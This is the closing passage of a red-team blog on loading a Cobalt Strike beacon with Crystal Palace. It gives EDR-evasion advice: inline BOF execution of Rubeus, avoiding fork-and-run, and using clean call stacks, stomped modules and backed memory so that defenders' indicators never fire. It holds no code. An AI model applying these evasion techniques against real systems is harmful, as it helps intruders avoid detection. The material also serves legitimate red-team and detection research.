[Previous (SHIFT+p)](https://www.youtube.com/watch?list=TLGGyzyhl5NNRvwxODAzMjAyNg&v=og-8yWW6IAA "Previous (SHIFT+p)")

0:00 / 1:41

•Live

•

# Post-Exploitation

A quick note on post-ex. If you watched the video you probably noticed alerts firing after executing Rubeus via the inlineExecute-Assembly BOF on the simple\_rdll payload, with one alert in particular worth calling out.

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=295,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_171011659-NMs3r4blOD2Zmz2M.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=140,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_171011659-NMs3r4blOD2Zmz2M.png)

.NET post-exploitation is commonly detected by monitoring for clr.dll being loaded from unbacked memory. Because our call stack is clean and beacon lives inside a stomped module, the load event itself is not considered suspicious. This is a good example of how properly loading and preserving beacon affects the entire chain beyond just the initial execution, steps downstream inherit the legitimacy you established at load time.

One more OPSEC note worth mentioning: avoid fork and run. Cobalt Strike post-ex capabilities like powerpick work by spawning a sacrificial process and injecting a DLL into it using the default reflective loader, which introduces all the IOCs we spent this entire blog eliminating. In the latest versions of Cobalt Strike you can load Crystal Palace directly into the client and use additional hooks to change how post-ex DLLs are injected and loaded. But as a general rule, prefer inline execution via BOFs over any out-of-process approach. The DLL load itself carries IOCs that BOF execution avoids entirely.

**Shellcode Loaders**

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=683,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_171210126-YIkoZoKtVjhCm54M.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=229,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_171210126-YIkoZoKtVjhCm54M.png)

As mentioned at the start, the UDRL is a self-contained PIC blob. Without something to execute it, it is just data on disk. There are plenty of quality resources and proof of concept shellcode loaders out there already.

What I do want to emphasise though, because it is the most important operational takeaway from this entire blog, is this: your shellcode loader does not matter if the reflective loader undoes everything.

This is the mistake most people make. They spend days engineering the perfect shellcode loader: indirect syscalls, process hollowing, parent process spoofing, stomped modules for the loader itself. And then the UDRL inside calls VirtualAlloc(RWX), maps beacon into a MEM\_PRIVATE anonymous region, and executes from there. Everything the outer loader achieved is immediately undone. The EDR does not even need to look at how the shellcode got there. It just looks at where beacon landed and what the call stack looks like, and it catches it in milliseconds.

The offensive security community is overwhelmingly focused on the delivery layer and almost completely ignores the reflective loading layer. You see posts about novel injection primitives, creative process selection, elaborate staging mechanisms. Very few people talk about what happens after the shellcode executes. That is the gap this blog is trying to close.

Having control over the full chain is what actually gives you the edge. Not because any single technique is magic, but because an EDR needs to find something wrong to fire an alert. If the delivery is clean, the memory region is backed, the call stack is legitimate, the sections are encrypted at sleep, and the signatures are gone both on disk and in memory, there is nothing left to find. Every layer you control is one less handle the defender has to grab onto.

The evasion lives inside the blob. Not in how it got there.

# CREDITS

I want to thank some incredible researchers and operators whose work and generosity made this project take a fraction of the time it otherwise would have.

Alessandro Magnosi (@KlezVirus) for his talks and for answering my DMs when he had the time and point me in the right direction when I was stuck. Daniel Duggan (@\_RastaMouse) for his unparalleled work, some of which is directly reused here from Crystal-kit, and for his CRTL updated course which was invaluable for quickly understanding Crystal Palace's moving parts. Go check both out. Alex Reid (@Octoberfest7) for the NtContinue entry point execution method, I have not personally taken his UDRL and SleepMask course but if you enjoyed this kind of content it will be 100% worth your time. Finally, I would like to say thank you to Codextf2 (@codex\_tf2) for being incredibly available to answer my dumb question during the dev process.

And of course, Raphael Mudge for building Crystal Palace in the first place. None of this exists without it.

That is it for today. I am going to go decompress with some Stardew Valley. Until next time, happy hacking.

[Go to Linkedin-in page](https://www.linkedin.com/in/lorenzo-meacci-71a224281 "Go to Linkedin-in page")[Go to Twitter page](https://x.com/LorenzoMeacci "Go to Twitter page")

Sharing knowledge on cybersecurity

© 2024\. All rights reserved.

Name

Last name

Your email\*

Message\*

Submit